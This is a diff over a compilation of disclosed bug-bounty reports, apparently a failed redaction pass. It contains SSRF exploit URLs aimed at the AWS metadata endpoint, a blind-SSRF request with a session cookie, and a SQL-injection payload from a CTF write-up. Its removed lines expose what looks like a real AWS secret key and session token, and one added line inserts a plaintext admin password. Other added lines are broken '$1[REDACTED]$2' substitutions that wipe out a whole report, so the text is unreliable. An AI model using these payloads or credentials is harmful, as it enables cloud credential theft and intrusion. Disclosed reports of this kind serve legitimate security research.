@@ -1240,115 +1240,9 @@ https://█████████/api/v1/download-url?url=http://169.254.169.2
   "Code" : "Success",
   "LastUpdated" : "2022-07-04T11:22:59Z",
   "Type" : "AWS-HMAC",
-  "AccessKeyId" : "███",
-  "SecretAccessKey" : "████",
-  "Token" : "████
-  ```
-===========================STEPS TO REPRODUCE==========================
-1) Go to the above Exploit URL, i.e; https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
-2) You will see the AWS Metadata being fetched and exposed.
-
-## Impact
-
-An attacker is able to explore and fertch the AWS metadata via the SSRF. This SSRF can be used to perform other attack vectors as well such as scanning internal ports. A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with.
-
----
-
-### [Blind SSRF via image upload URL downloader on https://██████/ ](https://hackerone.com/reports/1691501)
-
-- **Report ID:** `1691501`
-- **Severity:** High
-- **Weakness:** Server-Side Request Forgery (SSRF)
-- **Program:** U.S. Dept Of Defense
-- **Reporter:** @696e746c6f6c
-- **Bounty:** - usd
-- **Disclosed:** 2022-10-14T13:36:21.475Z
-- **CVE(s):** -
-
-**Vulnerability Information:**
-
-**Description:**
-Dear DoD,
-
-I found Blind SSRF on one domain from Hack US program.  Original domain is https://█████/ but when you make account and login it redirects you to https://███/my/. Here's the video PoC:
-
-██████
-
-
-Thank you!
-
-## Impact
-
-In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.
-
-## System Host(s)
-███████
-
-## Affected Product(s) and Version(s)
-Web App is infected.
-
-## CVE Numbers
-
-
-## Steps to Reproduce
-1. Create a one test account.
-2. Login to that account.
-3. Go to edit profile.
-4. Scroll down there.
-5. Notice user picture field.
-6. Try to upload something.
-7. You will see URL downloader.
-8. Open your burp collaborator client.
-9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
-10. Poll now in burp collaborator client.
-11. Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means
-we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
-12. Turn your foxy proxy on and open your burp suite.
-13. Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
-14. Intercept request. Request should look like this:
-```javascript
-POST /repository/repository_ajax.php?action=signin HTTP/1.1
-Host: █████████
-Cookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
-Accept: */*
-Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-X-Requested-With: XMLHttpRequest
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Content-Length: 295
-Origin: https://███████
-Referer: https://█████/user/edit.php
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-Connection: close
-
-file=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501
-```
-15. You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:
-```javascript
-HTTP/1.1 200 OK
-Server: nginx
-Date: Mon, 05 Sep 2022 14:05:32 GMT
-Content-Type: application/json; charset=utf-8
-Connection: close
-X-Powered-By: PHP/7.4.28
-Set-Cookie: RedirectDouble=1; path=/
-Set-Cookie: RedirectDouble=1; path=/
-Set-Cookie: RedirectDouble=1; path=/
-Set-Cookie: RedirectDouble=1; path=/
-Cache-Control: no-store, no-cache, must-revalidate
-Cache-Control: post-check=0, pre-check=0
-Pragma: no-cache
-Expires: Mon, 20 Aug 1969 09:23:00 GMT
-Last-Modified: Mon, 05 Sep 2022 14:05:32 GMT
-Accept-Ranges: none
-Strict-Transport-Security: max-age=31536000; includeSubDomains
-Content-Length: 261
-
-{"list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
+  $1[REDACTED]$2,
+  $1[REDACTED]$2,
+  $1[REDACTED]$2list":[],"nosearch":true,"norefresh":true,"nologin":true,"error":"HTTP\/1.1 404 Not Found\r\nServer: nginx\r\nDate: Mon, 05 Sep 2022 14:05:32 GMT\r\nContent-Type: text\/html; charset=utf-8\r\nContent-Length: 146\r\nConnection: keep-alive\r\n\r\n","repo_id":5
 ```
 16. By the way if you change to 25 port its leaking something about Postfix SMTP server. 
 17. Also I was able to identify that your web app is using libcurl.
@@ -1553,7 +1447,7 @@ and click Send request. If everything went well, the server responds "status ok"
 
 for this PoC. AWS secretkeys were accessed:
 
-`{  "Code" : "Success",  "LastUpdated" : "2022-07-06T02:57:53Z",  "Type" : "AWS-HMAC",  "AccessKeyId" : "███",  "SecretAccessKey" : "████",  "Token" :"██████",  "Expiration" : "2022-07-06T09:04:49Z"}`
+`{  "Code" : "Success",  "LastUpdated" : "2022-07-06T02:57:53Z",  "Type" : "AWS-HMAC",  $1[REDACTED]$2,  $1[REDACTED]$2,  $1[REDACTED]$2,  "Expiration" : "2022-07-06T09:04:49Z"}`
 
 ## Supporting Material/References:
 
@@ -1957,9 +1851,9 @@ Content-Length: 1298`
   "Code" : "Success",
   "LastUpdated" : "2020-09-11T00:36:00Z",
   "Type" : "AWS-HMAC",
-  "AccessKeyId" : "[REDACTED_SECRET]",
-  "SecretAccessKey" : "wAwYDQcsfEMUyku//RxXI/NjdAMUtRLj4cfSiEVQ",
-  "Token" : "IQoJb3JpZ2luX2VjEGEaCXVzLWVhc3QtMSJIMEYCIQD8srpZ/87c2HrLYddytORezee2NMx0/PWk4UH+2nahPgIhAOwlCmFgVAcdsUBpbDHI6McTLQcHlUnA/FAMOf5GoMWmKrQDCGoQABoMNDA5Mjc1MzM3MjQ3Igw+zvAcQIYJijsNTWsqkQMfVMu7kgOepBvF96NdZHk4KxICWOBDlrJN/MR9o3Hf6Ohst+4d/tbGeyCL7xClsepu+02nf/sX7Ggtx9ciqAg14OmsUWjzp4ZHntge0oi9AJpfyc76UVFNFdTwbo/hEEHKfjgC18lFW+E5DIP00Ifm7usFgLLABozP9Av/hJLwCWG7UHfnHicvc0eY9Tscc+RS4U0GWvUGGXji1vm/8ud5c7Ou6h2z2fo9fSODgq/c1sZReVtofuhSYOfpYtr4ByrHMVY78aR+VrF//6870MUJWNOI4EK3NFxtPH6HCJRmBwh3iVTqYI+vawove6BG3PmMkeyBZSqCqFCTuf+H/eEdw6orjNQ7BxurtB8ZaymaUABhNKfQTBeDBy8/G/wK75v7YZjPUmalMf89wGvshp5EHQVYySr3RGlS9Ti5FbIzR0Gl+5cLx/0AX6ce8L5UrXACpOLktOJe+l/W1KQchNOs9MEwSTYi+sa1qITd17XS9tp0BuRlZSX4MGQ0SJvDEmNvQq84avF4SLbqJLNZEVn0uDCkjev6BTrqAb5BqJ09VpgjlBloe0SAGp4uNlWheqWl+Vt3S+jcVRqf4LNAM3hbEvRB6pTt9itSE6l4y40QADcmMs0oWc6sm+oCG5enAkRxQBFYFDt+OvbxnSnQmaG3YDuRRJwpsaMA/V0TLqpQq5wvJMOssylXffenYIFpVIbZ5BQ5elDVqVpol/1fe+ej3slNvG6VqD3/OwLyNPjfAhdG3UmYzqyr3ym6uywn0KmLMY9esM7Mde5KA2LmgozCKpkV18u0LGCORGXGnllCWpuifVMYXoLQJgk8LCB5H6FbBbcqVvE5FGabClXZG3UIbhPsfg==",
+  $1[REDACTED]$2,
+  $1[REDACTED]$2,
+  $1[REDACTED]$2,
   "Expiration" : "2020-09-11T06:47:23Z"
 }`
 
@@ -3034,7 +2928,7 @@ name = lol'+or+Ascii(substring((Select+concat(password)+from+admin+limit+0,1),1,
 ```
 Now we have the username and password to login [admin panel](https://hackyholidays.h1ctf.com/evil-quiz/admin)
 username = admin  
-[REDACTED_SECRET]$
+password = S3creT_p4ssw0rd-$
 
 Upon logging with above credentials, we can see the flag finally.
 
